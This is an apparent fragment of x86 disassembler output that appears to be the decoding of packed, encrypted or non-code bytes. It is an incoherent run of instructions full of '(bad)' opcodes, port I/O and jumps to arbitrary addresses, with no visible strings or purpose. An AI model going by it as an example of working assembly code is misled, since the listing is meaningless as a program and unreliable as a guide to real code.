  42206f:	sub    BYTE PTR [eax-0x48261e9d],dl
  422075:	adc    eax,0x41822091
  42207a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42207b:	mov    al,ds:0x1390b520
  422080:	enter  0xdb66,0x42
  422084:	jnp    0x4220f0
  422086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422087:	lock arpl WORD PTR [ebx-0xa64d68c],bx
  42208e:	sub    ch,BYTE PTR [edi-0xd03dcb4]
  422094:	xchg   ecx,eax
  422095:	cli    
  422096:	(bad)  
  422097:	fsubrp st(6),st
  422099:	test   edi,edi
  42209b:	repz dec esi
  42209d:	fsubr  st,st(1)
  42209f:	mov    ch,0xcb
  4220a1:	popa   
  4220a2:	pusha  
  4220a3:	jle    0x422047
  4220a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220a6:	jg     0x42202e
  4220a8:	(bad)  
  4220a9:	(bad)  
  4220aa:	jg     0x422118
  4220ac:	push   edx
  4220ad:	inc    ecx
  4220ae:	add    BYTE PTR [edx+0x1c],0x18
  4220b2:	in     al,0xa7
  4220b4:	out    dx,al
  4220b5:	(bad)  
  4220b6:	push   ecx
  4220b7:	aad    0x14
  4220b9:	inc    esi
  4220ba:	outs   dx,BYTE PTR ds:[esi]
  4220bb:	lock inc ebx
  4220bd:	mov    bl,0xa3
  4220bf:	and    esi,edi
  4220c1:	cmc    
  4220c2:	ds jbe 0x4220bc
  4220c5:	dec    eax
  4220c6:	xchg   ecx,eax
  4220c7:	push   eax
  4220c8:	aas    
  4220c9:	retf   0xe79c
  4220cc:	or     ah,ch
  4220ce:	cld    
  4220cf:	stos   BYTE PTR es:[edi],al
  4220d0:	inc    ebp
  4220d1:	scas   al,BYTE PTR es:[edi]
  4220d2:	inc    eax
  4220d3:	ror    esi,1
  4220d5:	fidivr WORD PTR [eax+0x33]
  4220d8:	xlat   BYTE PTR ds:[ebx]
  4220d9:	mov    ch,0x94
  4220db:	outs   dx,DWORD PTR ds:[esi]
  4220dc:	dec    edi
  4220dd:	ins    BYTE PTR es:[edi],dx
  4220de:	ret    0x21b4
  4220e1:	mov    al,0xf1
  4220e3:	mov    ds:0xa3983ba3,al
  4220e8:	(bad)  
  4220e9:	lea    esi,[edi]
  4220eb:	aas    
  4220ec:	addr16 xchg esi,eax
  4220ee:	int    0xdf
  4220f0:	les    ebx,FWORD PTR [ebx]
  4220f2:	imul   esi,esp,0xe1961023
  4220f8:	cmp    eax,0x19fb8a1b
  4220fd:	popf   
  4220fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220ff:	xor    ah,BYTE PTR [edi]
  422101:	cmp    al,BYTE PTR [ebx]
  422103:	pop    ebp
  422104:	pop    esp
  422105:	fcmovb st,st(3)
  422107:	jmp    0x2de94b44
  42210c:	xchg   esi,eax
  42210d:	dec    esi
  42210e:	xor    DWORD PTR [esi+0x2f],eax
  422111:	add    ebx,edi
  422113:	(bad)  
  422114:	ficom  DWORD PTR [esi+0x59]
  422117:	test   DWORD PTR [edi],ebx
  422119:	loopne 0x4220fe
  42211b:	and    DWORD PTR [ebp+0x26],0x77c4afa
  422122:	xor    al,0xe2
  422124:	xchg   edx,eax
  422125:	test   eax,0xe83b4a55
  42212a:	sub    bl,dh
  42212c:	fs ins DWORD PTR es:[edi],dx
  42212e:	rcl    bl,1
  422130:	sub    al,BYTE PTR [edi+0x7a707b49]
  422136:	pop    ecx
  422137:	aad    0xd3
  422139:	jmp    FWORD PTR [edi-0x4c]
  42213c:	int3   
  42213d:	dec    esi
  42213e:	dec    edi
  42213f:	outs   dx,BYTE PTR ds:[esi]
  422140:	push   esp
  422141:	mov    eax,0x36ebb50d
  422146:	mov    ah,dl
  422148:	inc    esp
  422149:	inc    ecx
  42214a:	hlt    
  42214b:	or     DWORD PTR [ebx],eax
  42214d:	sub    DWORD PTR [ebx-0x76c58b60],eax
  422153:	push   esp
  422154:	fxch   st(3)
  422156:	test   DWORD PTR [ebp+0x5e],ebp
  422159:	or     al,0xeb
  42215b:	adc    eax,0xadd5d3e8
  422160:	cld    
  422161:	xchg   esi,eax
  422162:	adc    BYTE PTR [ebx-0x23],dl
  422165:	pop    ecx
  422166:	mov    al,ds:0x8c9781a9
  42216b:	das    
  42216c:	mov    dh,0xaa
  42216e:	jbe    0x42216b
  422170:	pop    ebx
  422171:	(bad)  
  422172:	xlat   BYTE PTR ds:[ebx]
  422173:	cmp    DWORD PTR [edi],eax
  422175:	push   cs
  422176:	adc    BYTE PTR [edi+0x177d791],ah
  42217c:	test   BYTE PTR [esi+0x2d6dd023],0x99
  422183:	mov    edx,DWORD PTR [ebx-0x23]
  422186:	sbb    bl,BYTE PTR [edi+0x7ee334ba]
  42218c:	xlat   BYTE PTR ds:[ebx]
  42218d:	std    
  42218e:	outs   dx,BYTE PTR ds:[esi]
  42218f:	retf   
  422190:	fwait
  422191:	cmp    al,0x3b
  422193:	jae    0x4221aa
  422195:	push   0x4c7d9763
  42219a:	out    dx,eax
  42219b:	push   ecx
  42219c:	push   ebx
  42219d:	hlt    
  42219e:	cs jge 0x4221b0
  4221a1:	dec    edi
  4221a2:	ss xchg edi,ecx
  4221a5:	cwde   
  4221a6:	imul   ebx,DWORD PTR [edx],0x5ff8aacb
  4221ac:	and    dh,al
  4221ae:	mov    esp,0xd063a28c
  4221b3:	imul   eax,eax,0x13a6e6df
  4221b9:	jb     0x42217e
  4221bb:	push   es
  4221bc:	or     BYTE PTR [esi],bh
  4221be:	add    BYTE PTR [edi-0x80],al
  4221c1:	sbb    esp,DWORD PTR [eax+0x102e2676]
  4221c7:	jbe    0x422207
  4221c9:	jecxz  0x422240
  4221cb:	jle    0x422219
  4221cd:	(bad)  
  4221ce:	popa   
  4221cf:	(bad)  
  4221d0:	push   ds
  4221d1:	mov    al,0x8b
  4221d3:	mov    ecx,0xff4c686b
  4221d8:	cdq    
  4221d9:	adc    DWORD PTR [edx+ecx*4-0x44],edi
  4221dd:	sbb    ebx,ebp
  4221df:	data16 jge 0x42219f
  4221e2:	lea    edi,[eax+0x1e]
  4221e5:	push   es
  4221e6:	inc    esp
  4221e7:	out    0x4c,al
  4221e9:	cdq    
  4221ea:	inc    DWORD PTR [edi-0x7e1119a2]
  4221f0:	adc    DWORD PTR [edi],ecx
  4221f2:	call   0xac6991
  4221f7:	add    al,ah
  4221f9:	xchg   esi,eax
  4221fa:	aas    
  4221fb:	les    edi,FWORD PTR [esi+0x34096129]
  422201:	inc    esp
  422202:	cmp    eax,0x83c696ef
  422207:	sar    DWORD PTR ds:0xd63f60b6,1
  42220d:	or     BYTE PTR [ebx],0xb6
  422210:	pop    ebp
  422211:	in     eax,dx
  422212:	movzx  ebx,al
  422215:	mov    bl,0x3e
  422217:	mov    esp,0x93774975
  42221c:	test   DWORD PTR [ecx+0x24],esi
  42221f:	test   eax,0xf61c798e
  422224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422225:	and    DWORD PTR [ebx-0x2b2ea4ab],ebp
  42222b:	push   0x30b74a78
  422230:	not    DWORD PTR [edx-0xcb1d25a]
  422236:	jg     0x4221df
  422238:	push   ecx
  422239:	mov    fs,esp
  42223b:	push   edi
  42223c:	and    ch,BYTE PTR [ebx+0xb]
  42223f:	into   
  422240:	sbb    DWORD PTR [eax+0x14],ecx
  422243:	jo     0x422243
  422245:	ror    DWORD PTR [eax],0xc4
  422248:	ss sub ecx,ecx
  42224b:	stos   DWORD PTR es:[edi],eax
  42224c:	mov    al,0x2f
  42224e:	push   ecx
  42224f:	cdq    
  422250:	sub    BYTE PTR [ecx],0x3e
  422253:	js     0x4222a8
  422255:	xchg   ecx,eax
  422256:	fld    st(6)
  422258:	dec    ebx
  422259:	mov    ds:0xba75072b,eax
  42225e:	mov    edx,0x663694f7
  422263:	and    DWORD PTR [esi],ebx
  422265:	mov    ds:0xff736833,eax
  42226a:	je     0x42223a
  42226c:	ins    BYTE PTR es:[edi],dx
  42226d:	nop
  42226e:	icebp  
  42226f:	fcomp  DWORD PTR [ebp+0x30]
  422272:	adc    BYTE PTR [edi],ah
  422274:	icebp  
  422275:	or     DWORD PTR [edx-0x60cc998f],ebx
  42227b:	(bad)  
  42227c:	ss dec esp
  42227e:	jne    0x4222e2
  422280:	xchg   edx,eax
  422281:	and    ah,BYTE PTR [ecx+0x18]
  422284:	arpl   WORD PTR [ecx-0x6579f443],bx
  42228a:	xor    eax,0xb941c81e
  42228f:	pop    ebx
  422290:	ret    
  422291:	sbb    eax,0x1a42bd6a
  422296:	or     al,0x2a
  422298:	push   esi
  422299:	popf   
  42229a:	fdiv   QWORD PTR [ebx-0x19540d7]
  4222a0:	sub    al,0xc5
  4222a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222a3:	mov    esi,0xc3e8c3b8
  4222a8:	xchg   edx,eax
  4222a9:	fimul  WORD PTR ds:0x52e63eb6
  4222af:	call   0x771bd059
  4222b4:	mov    esi,0xa52dedf2
  4222b9:	inc    esi
  4222ba:	cmc    
  4222bb:	jl     0x422274
  4222bd:	(bad)  
  4222be:	das    
  4222bf:	inc    ecx
  4222c0:	or     cl,0xef
  4222c3:	aam    0x15
  4222c5:	adc    eax,0x74f30d47
  4222ca:	dec    edi
  4222cb:	adc    ebx,0xffffffd5
  4222ce:	or     al,cl
  4222d0:	xor    DWORD PTR [edx-0x3cb18171],0x73
  4222d7:	mov    ds:0x51a3dd3e,eax
  4222dc:	aam    0x99
  4222de:	(bad)  
  4222e0:	rcl    esi,0x12
  4222e3:	mov    ch,0x29
  4222e5:	cmp    al,0x15
  4222e7:	iret   
  4222e8:	xlat   BYTE PTR ds:[ebx]
  4222e9:	rcl    BYTE PTR gs:[edx+edi*8+0x42d8c034],1
  4222f1:	sbb    dl,BYTE PTR [esi]
  4222f3:	fadd   QWORD PTR [esi+0x172a16b1]
  4222f9:	daa    
  4222fa:	jp     0x422333
  4222fc:	mov    WORD PTR [ecx+0x5a301b4a],cs
  422302:	pop    edi
  422303:	add    BYTE PTR [eax-0x6fa1cc2d],ch
  422309:	inc    eax
  42230a:	or     DWORD PTR [esi+edx*4],eax
  42230d:	mov    ds:0xb2263a50,al
  422312:	xor    DWORD PTR [edx],edi
  422314:	mov    al,0x4d
  422316:	int3   
  422317:	cmp    eax,0x6a8a412b
  42231c:	sar    DWORD PTR [edx+0x63],0x73
  422320:	add    eax,0x6bb38ee7
  422325:	sti    
  422326:	aad    0x6f
  422328:	jne    0x422391
  42232a:	adc    DWORD PTR [ecx],ebp
  42232c:	test   DWORD PTR [eax],edx
  42232e:	sbb    DWORD PTR [ebx+0x6f839564],edi
  422334:	push   eax
  422335:	(bad)  
  422336:	pusha  
  422337:	test   BYTE PTR [eax-0x466fe2c0],0xd0
  42233e:	cmp    dl,BYTE PTR [esp+ebx*1]
  422341:	loop   0x422347
  422343:	loope  0x4222ed
  422345:	stos   DWORD PTR es:[edi],eax
  422346:	lods   ax,WORD PTR ds:[si]
  422349:	xchg   ecx,eax
  42234a:	cmc    
  42234b:	xchg   esp,eax
  42234c:	jae    0x4223a3
  42234e:	or     esi,DWORD PTR [esp+ecx*4-0x4a]
  422352:	cmp    ah,bh
  422354:	dec    eax
  422355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422356:	sub    BYTE PTR [ebx],cl
  422358:	push   0x659b58a1
  42235d:	js     0x422357
  42235f:	or     ecx,DWORD PTR [edx]
  422361:	cmp    ebx,0xffffffae
  422364:	ss cwde 
  422366:	retf   
  422367:	and    BYTE PTR [ecx],dl
  422369:	pushf  
  42236a:	xor    esp,DWORD PTR [ebx]
  42236c:	scas   al,BYTE PTR es:[edi]
  42236d:	outs   dx,BYTE PTR ds:[esi]
  42236e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42236f:	inc    esp
  422370:	xchg   edi,eax
  422371:	pop    esp
  422372:	push   ebx
  422373:	xchg   DWORD PTR [esi+0x648250a1],eax
  422379:	mov    al,ds:0x94e57797
  42237e:	popa   
  42237f:	or     DWORD PTR [ebp+0x6cde5d50],esi
  422385:	pop    eax
  422386:	xor    al,0x20
  422388:	adc    DWORD PTR [ebp-0x1f2b31b1],esp
  42238e:	stos   BYTE PTR es:[edi],al
  42238f:	jmp    0x42236b
  422391:	ins    BYTE PTR es:[edi],dx
  422392:	adc    ebp,esi
  422394:	sub    esp,0xb26c7021
  42239a:	lahf   
  42239b:	sar    BYTE PTR [edx],cl
  42239d:	(bad)  
  42239f:	xchg   edx,eax
  4223a0:	adc    BYTE PTR [ebx+0x37e798da],al
  4223a6:	in     al,0x54
  4223a8:	mov    al,ds:0xf78e9f8c
  4223ad:	pusha  
  4223ae:	dec    ebx
  4223af:	pop    esp
  4223b0:	and    BYTE PTR [esi-0x554e28ff],ah
  4223b6:	sub    eax,0xb493122e
  4223bb:	stos   BYTE PTR es:[edi],al
  4223bc:	in     eax,dx
  4223bd:	push   esi
  4223be:	mov    eax,0x8fb4e205
  4223c3:	xchg   DWORD PTR [eax],ecx
  4223c5:	or     BYTE PTR [esi+0x73],ah
  4223c8:	pop    edi
  4223c9:	rol    BYTE PTR [ebp+0x7d],1
  4223cc:	sub    al,BYTE PTR ds:0xce2a3d43
  4223d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223d3:	mov    ch,0xca
  4223d5:	jne    0x4223d4
  4223d7:	shl    DWORD PTR [esi],cl
  4223d9:	xchg   esi,eax
  4223da:	inc    ebx
  4223db:	leave  
  4223dc:	cmp    DWORD PTR ds:0x9969fbba,edx
  4223e2:	dec    ebx
  4223e3:	cmp    DWORD PTR [ebx],ecx
  4223e5:	jl     0x4223fa
  4223e7:	adc    BYTE PTR ds:[ebp+0xc],0xa7
  4223ec:	fnstsw WORD PTR [ebp+eax*8+0x13a6dcab]
  4223f3:	retf   
  4223f4:	icebp  
  4223f5:	push   ds
  4223f6:	ss fucom st(2)
  4223f9:	cmp    al,0x3
  4223fb:	pop    ss
  4223fc:	add    eax,DWORD PTR [eax-0x537f3339]
  422402:	(bad)  
  422403:	and    edx,DWORD PTR [edi+0x6b]
  422406:	adc    DWORD PTR [ecx+0x29],ebx
  422409:	bound  ebp,QWORD PTR [ebx-0x27226f5d]
  42240f:	jge    0x422414
  422411:	fidiv  WORD PTR [edi]
  422413:	cli    
  422414:	ds inc ebp
  422416:	inc    edx
  422417:	ds push ss
  422419:	adc    al,0x98
  42241b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42241c:	sti    
  42241d:	mov    ecx,0x6dd8c611
  422422:	jns    0x4223f9
  422424:	mov    al,0x64
  422426:	push   0x46826d15
  42242b:	xchg   DWORD PTR [ecx+0x280098d4],esi
  422431:	fcomp  QWORD PTR [ebx+0xe07ac33]
  422437:	adc    ah,BYTE PTR [ebp-0x727dc4d1]
  42243d:	mov    bh,0x1a
  42243f:	pushf  
  422440:	shr    DWORD PTR [eax-0x5e],1
  422443:	aad    0xc
  422445:	imul   esi,DWORD PTR ds:0x582ea387,0xd8a8e86b
  42244f:	dec    edx
  422450:	jecxz  0x42245c
  422452:	mov    DWORD PTR [esp+esi*2-0x361bd60b],esp
  422459:	xchg   ebx,eax
  42245a:	mov    ecx,0x5491728b
  42245f:	ficom  WORD PTR [ebx+0x745a9f37]
  422465:	int    0x32
  422467:	mov    ch,0xe6
  422469:	fistp  WORD PTR [edx]
  42246b:	ds ss stc 
  42246e:	or     ebp,edx
  422470:	daa    
  422471:	sub    edi,ebx
  422473:	sbb    al,0x8
  422475:	pop    ss
  422476:	adc    BYTE PTR [esi],dl
  422478:	mov    edi,0x3b59abdd
  42247d:	test   cl,ah
  42247f:	mov    ah,0x99
  422481:	lds    ebp,FWORD PTR [ebx-0x3]
  422484:	dec    ebp
  422485:	icebp  
  422486:	sub    ebp,DWORD PTR [edi+0x3cf661ac]
  42248c:	pusha  
  42248d:	outs   dx,BYTE PTR ds:[esi]
  42248e:	mov    bl,0x3f
  422490:	int3   
  422491:	sar    BYTE PTR [ebx],cl
  422493:	pop    edi
  422494:	pop    ebx
  422495:	add    eax,0x90e8da04
  42249a:	fisubr WORD PTR [ebp-0x6e]
  42249d:	je     0x42244b
  42249f:	ds stos BYTE PTR es:[edi],al
  4224a1:	sbb    eax,0xa380cd77
  4224a6:	mov    ?,WORD PTR ds:0x89f33737
  4224ac:	sbb    al,0x1
  4224ae:	loopne 0x4224ca
  4224b0:	push   eax
  4224b1:	fcmovb st,st(4)
  4224b3:	test   DWORD PTR [ecx+0x2b32bd19],esp
  4224b9:	add    eax,0x1369f5f4
  4224be:	add    esp,eax
  4224c0:	mov    ch,0xd4
  4224c2:	in     al,0x85
  4224c4:	and    ebp,DWORD PTR [ecx+0x7f4ca0ec]
  4224ca:	test   BYTE PTR [eax],ah
  4224cc:	fs push ds
  4224ce:	add    eax,0x65cff3fc
  4224d3:	or     edx,esi
  4224d5:	push   esp
  4224d6:	adc    esp,esi
  4224d8:	aaa    
  4224d9:	inc    eax
  4224da:	cli    
  4224db:	xor    DWORD PTR [ecx-0x57],ecx
  4224de:	or     ecx,ecx
  4224e0:	mov    edx,0xa527aa5e
  4224e5:	je     0x42248d
  4224e7:	or     BYTE PTR [edx+0x5],ah
  4224ea:	xchg   ebx,eax
  4224eb:	mov    ebx,0x6f72deff
  4224f0:	cwde   
  4224f1:	gs jno 0x422518
  4224f4:	(bad)  [edi-0xd]
  4224f7:	and    al,al
  4224f9:	add    ch,BYTE PTR [edi+0x1773235a]
  4224ff:	and    ch,BYTE PTR [edx]
  422501:	lods   al,BYTE PTR ds:[esi]
  422502:	gs mov dh,0x2d
  422505:	out    dx,al
  422506:	shl    BYTE PTR [edx-0x49],cl
  422509:	mov    ecx,eax
  42250b:	mov    ebx,0x5d9f0ec9
  422510:	enter  0x1a00,0xf5
  422514:	outs   dx,BYTE PTR ds:[esi]
  422515:	xor    bh,al
  422517:	push   edx
  422518:	es daa 
  42251a:	aaa    
  42251b:	adc    al,0xf7
  42251d:	cs ss dec eax
  422520:	mov    ebx,0x33a1aa71
  422525:	xchg   esp,eax
  422526:	fisttp QWORD PTR [esi-0x3d461e2]
  42252c:	jb     0x4225a1
  42252e:	sti    
  42252f:	dec    ebp
  422530:	jecxz  0x422565
  422532:	icebp  
  422533:	je     0x422548
  422535:	fdivr  st,st(2)
  422537:	xchg   ebx,eax
  422538:	mov    eax,ds:0x893aad85
  42253d:	dec    edx
  42253e:	std    
  42253f:	out    0x7f,al
  422541:	xchg   ebp,eax
  422542:	icebp  
  422543:	cmp    BYTE PTR [esi+0x4627e515],dl
  422549:	out    0xad,al
  42254b:	mov    ebp,DWORD PTR [ebp-0x309ff5e4]
  422551:	mov    esi,DWORD PTR [ecx+0x48d05398]
  422557:	cs scas eax,DWORD PTR es:[edi]
  422559:	mov    al,dh
  42255b:	dec    ecx
  42255c:	mov    bl,0x95
  42255e:	push   es
  42255f:	leave  
  422560:	loopne 0x4225b8
  422562:	(bad)  
  422563:	jle    0x4224f1
  422565:	fist   WORD PTR ds:0x7acf4dc6
  42256b:	aad    0x68
  42256d:	adc    ebx,DWORD PTR [ebp+0x11]
  422570:	or     ebx,DWORD PTR [ebx]
  422572:	jmp    0xda8d:0xcbf44ae0
  422579:	out    dx,eax
  42257a:	xchg   DWORD PTR [eax+edi*1+0x32],ebp
  42257e:	sub    DWORD PTR [edx+0x62],ecx
  422581:	or     ebp,eax
  422583:	sbb    al,0x93
  422585:	(bad)  
  422586:	retf   0x2ae
  422589:	bswap  esi
  42258b:	xchg   BYTE PTR [ecx-0xf9a0fad],ah
  422591:	mov    ah,ah
  422593:	mov    edi,0x82c3df61
  422598:	xor    edx,edx
  42259a:	mov    esp,0xb5bcc9e8
  42259f:	add    edx,DWORD PTR [esi]
  4225a1:	pop    edi
  4225a2:	jp     0x422579
  4225a4:	sti    
  4225a5:	rcr    BYTE PTR [eax],0x74
  4225a8:	dec    eax
  4225a9:	call   FWORD PTR [ecx+0x2a661879]
  4225af:	jmp    0xb334:0xba6585ce
  4225b6:	push   ebx
  4225b7:	mov    edx,0x7ea633e
  4225bc:	mov    bl,0x34
  4225be:	mov    ch,0x17
  4225c0:	xchg   BYTE PTR [esp+eax*1+0x1e039b43],ah
  4225c7:	mov    ds:0x5c540b8f,al
  4225cc:	inc    ecx
  4225cd:	mov    al,0xe1
  4225cf:	jmp    0x422647
  4225d1:	xchg   ecx,eax
  4225d2:	xchg   ebx,eax
  4225d3:	dec    ebx
  4225d4:	xor    al,0x2
  4225d6:	(bad)  
  4225d7:	jmp    0x422627
  4225d9:	out    0xfc,al
  4225db:	or     ax,ax
  4225de:	jg     0x422654
  4225e0:	jmp    0xd31f:0x2d793440
  4225e7:	pop    esp
  4225e8:	add    BYTE PTR [ecx-0x38],cl
  4225eb:	(bad)
  4225ee:	add    edi,ebp
  4225f0:	adc    DWORD PTR [ebx-0x19065c93],eax
  4225f6:	adc    esp,edi
  4225f8:	(bad)  
  4225fb:	and    ebx,DWORD PTR [eax]
  4225fd:	int3   
  4225fe:	sub    ch,bl
  422600:	mov    bh,0x15
  422602:	add    BYTE PTR [edi-0x6c4532f],ah
  422608:	cmp    DWORD PTR [ebp-0x66],edi
  42260b:	jl     0x42258f
  42260d:	fbstp  TBYTE PTR [edi-0x51]
  422610:	jecxz  0x4225b9
  422612:	dec    ebp
  422613:	retf   
  422614:	xlat   BYTE PTR ds:[ebx]
  422615:	and    ch,BYTE PTR [esi]
  422617:	pop    ebx
  422618:	adc    ecx,DWORD PTR [ecx]
  42261a:	mov    al,0xd7
  42261c:	or     BYTE PTR [ebx-0x2c566340],ch
  422622:	inc    esp
  422623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422624:	std    
  422625:	in     al,0x0
  422627:	daa    
  422628:	sar    DWORD PTR [edx-0x1acecf2],0x72
  42262f:	rsqrtps xmm7,XMMWORD PTR [ebp-0x5110ede6]
  422636:	lock pop esp
  422638:	mov    esp,0x9e15fb30
  42263d:	out    dx,eax
  42263e:	retf   
  42263f:	fwait
  422640:	popf   
  422641:	test   ebx,ebp
  422643:	jo     0x422606
  422645:	or     esi,ebx
  422647:	and    BYTE PTR [ebp-0x5adfcc69],bl
  42264d:	rol    DWORD PTR [edx-0x6f378b73],cl
  422653:	icebp  
  422654:	push   edx
  422655:	int3   
  422656:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  422658:	cmp    edi,edx
  42265a:	or     DWORD PTR [ebx],eax
  42265c:	or     al,0x36
  42265e:	stc    
  42265f:	lods   eax,DWORD PTR ds:[esi]
  422660:	dec    ecx
  422661:	pusha  
  422662:	xor    ebx,DWORD PTR [edi-0x2f]
  422665:	cli    
  422666:	sti    
  422667:	aas    
  422668:	aam    0xa6
  42266a:	ins    BYTE PTR es:[edi],dx
  42266b:	pop    esi
  42266c:	dec    ebx
  42266d:	retf   
  42266e:	push   esp
  42266f:	mov    BYTE PTR [edx+0x722fb99a],dh
  422675:	les    edx,FWORD PTR [ecx-0x6d]
  422678:	and    bh,ah
  42267a:	mov    ecx,ebx
  42267c:	popf   
  42267d:	cmp    ah,0x34
  422680:	inc    ebx
  422681:	(bad)  
  422682:	in     al,0x14
  422684:	jl     0x422675
  422686:	pop    esi
  422687:	into   
  422688:	popf   
  422689:	dec    esi
  42268a:	push   edx
  42268b:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42268d:	dec    edx
  42268e:	sbb    cl,BYTE PTR [edi+0x2a]
  422691:	pop    DWORD PTR ss:[eax-0x33]
  422695:	mov    esi,0x3effa4fd
  42269a:	shr    BYTE PTR [ebp+0x5f989679],1
  4226a0:	je     0x422687
  4226a2:	jae    0x4226ec
  4226a4:	mov    ecx,esi
  4226a6:	jo     0x42270e
  4226a8:	cmp    BYTE PTR [ebx],bl
  4226aa:	hlt    
  4226ab:	sub    eax,0x7a469dd
  4226b0:	add    bl,BYTE PTR [edi-0xc971b98]
  4226b6:	pop    ebp
  4226b7:	jmp    DWORD PTR [edi+edx*1-0x7b324661]
  4226be:	(bad)  
  4226bf:	(bad)  
  4226c0:	aam    0x97
  4226c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c3:	into   
  4226c4:	pushf  
  4226c5:	cwde   
  4226c6:	mov    edx,0x85e9b60d
  4226cb:	rol    eax,0xa7
  4226ce:	and    eax,0x519e416f
  4226d3:	mov    al,ds:0xaf4e06c5
  4226d8:	add    eax,0x16f68be1
  4226dd:	nop
  4226de:	pop    ecx
  4226df:	icebp  
  4226e0:	dec    BYTE PTR ds:[edi+0x0]
  4226e4:	fbld   TBYTE PTR [ebp-0x24]
  4226e7:	add    bh,BYTE PTR [edx-0x31c146a2]
  4226ed:	mov    ecx,0x9abcdf82
  4226f2:	nop
  4226f3:	bound  ecx,QWORD PTR [edx-0x3f7cc3d3]
  4226f9:	pop    esi
  4226fa:	out    dx,al
  4226fb:	jl     0x4226a0
  4226fd:	jge    0x422764
  4226ff:	out    0x37,al
  422701:	push   ebp
  422702:	(bad)
  422706:	fsubr  QWORD PTR [edi]
  422708:	loop   0x42269d
  42270a:	(bad)  
  42270b:	jp     0x422763
  42270d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42270e:	pop    edx
  42270f:	sbb    DWORD PTR [ebp-0x5a],ebx
  422712:	jnp    0x42271f
  422714:	inc    esp
  422715:	pop    ecx
  422716:	push   0x699ea889
  42271b:	icebp  
  42271c:	cmp    eax,0xaaa2710c
  422721:	retf   0x9f5
  422724:	sti    
  422725:	sar    BYTE PTR [ebp-0x7c],cl
  422728:	mov    ebp,0xd2087cdc
  42272d:	add    eax,DWORD PTR [edi-0x36]
  422730:	fcmovnu st,st(1)
  422732:	sbb    edx,DWORD PTR [edi+0x141bb828]
  422738:	sar    edi,1
  42273a:	push   0x1089a3b6
  42273f:	arpl   WORD PTR [bp-0xa80],dx
  422744:	push   ebx
  422745:	pop    es
  422746:	or     eax,ebx
  422748:	das    
  422749:	daa    
  42274a:	aaa    
  42274b:	loopne 0x422771
  42274d:	aas    
  42274e:	dec    ebx
  42274f:	or     al,0x56
  422751:	out    dx,eax
  422752:	and    BYTE PTR ds:[ecx+0x4c],dl
  422756:	push   ds
  422757:	jmp    0x553ab134
  42275c:	xchg   ecx,eax
  42275d:	fs dec esi
  42275f:	push   ss
  422760:	aaa    
  422761:	add    BYTE PTR [edi],bl
  422763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422764:	leave  
  422765:	mov    esp,0x401e7ce7
  42276a:	retf   0xf314
  42276d:	adc    BYTE PTR [ecx+0x7809aca8],bh
  422773:	lea    esp,ss:[ebx+0x3b0440f9]
  42277a:	pop    ebp
  42277b:	shl    BYTE PTR [eax+0x1e],cl
  42277e:	popa   
  42277f:	fsubr  st(2),st
  422781:	pop    eax
  422782:	push   0x36
  422784:	mov    dh,0x8
  422786:	jecxz  0x422768
  422788:	or     ebp,ebx
  42278a:	std    
  42278b:	mov    ch,0xe4
  42278d:	lock cmp eax,0xa109ac1c
  422793:	xchg   BYTE PTR [ecx+0x35],bh
  422796:	ins    BYTE PTR es:[edi],dx
  422797:	aam    0xa6
  422799:	xlat   BYTE PTR ds:[ebx]
  42279a:	mov    cl,0xe0
  42279c:	in     eax,0xe0
  42279e:	data16 jp 0x4227fb
  4227a1:	and    al,0x9d
  4227a3:	addr16 or eax,0x9509edd3
  4227a9:	push   esp
  4227aa:	push   es
  4227ab:	mov    WORD PTR [ecx+0x43943da7],fs
  4227b1:	outs   dx,DWORD PTR ds:[esi]
  4227b2:	sub    ebp,edx
  4227b4:	and    DWORD PTR [ecx+0x64],0x3f
  4227b8:	jae    0x42276b
  4227ba:	sbb    BYTE PTR [ecx+eax*8-0x1dbcec1d],0xc5
  4227c2:	mov    cl,0xdb
  4227c4:	and    eax,DWORD PTR [ebx]
  4227c6:	jp     0x42277c
  4227c8:	sub    edi,DWORD PTR [eax-0xf46021d]
  4227ce:	data16 out 0xb0,al
  4227d1:	sbb    DWORD PTR [esi+0x55d61a66],esp
  4227d7:	mov    al,0xb0
  4227d9:	xor    dl,bl
  4227db:	add    eax,0x4a849502
  4227e0:	and    BYTE PTR [ecx],0x96
  4227e3:	xor    ecx,DWORD PTR [edi-0xd]
  4227e6:	in     al,0x40
  4227e8:	cmc    
  4227e9:	sub    BYTE PTR [ebx],dh
  4227eb:	ins    DWORD PTR es:[edi],dx
  4227ec:	ds inc ecx
  4227ee:	jnp    0x422834
  4227f0:	(bad)  
  4227f1:	popf   
  4227f2:	test   BYTE PTR [esi],0xbb
  4227f5:	jle    0x422786
  4227f7:	sub    BYTE PTR [edx+0x61e6fd74],0xc
  4227fe:	addr16 dec esp
  422800:	mov    ebp,DWORD PTR [esi]
  422802:	in     eax,0x17
  422804:	out    0x22,eax
  422806:	in     eax,dx
  422807:	out    0x30,al
  422809:	jns    0x4227fe
  42280b:	inc    ax
  42280d:	sbb    ch,BYTE PTR [eax-0x59]
  422810:	out    0x7f,eax
  422812:	pop    ebp
  422813:	repnz dec ebx
  422815:	retf   
  422816:	sub    eax,0xd1199b3b
  42281b:	sub    ecx,DWORD PTR [ebx]
  42281d:	mov    al,0x8f
  42281f:	in     al,0xbd
  422821:	inc    edi
  422822:	push   ecx
  422823:	mov    bh,0x95
  422825:	adc    edi,ecx
  422827:	xchg   ebp,eax
  422828:	neg    BYTE PTR [ecx]
  42282a:	sbb    eax,0xa207e2a3
  42282f:	mov    ebx,0x9858ba2b
  422834:	shl    DWORD PTR [ebp+0x13],cl
  422837:	add    al,0x52
  422839:	daa    
  42283a:	xor    al,0xa2
  42283c:	cdq    
  42283d:	jbe    0x422830
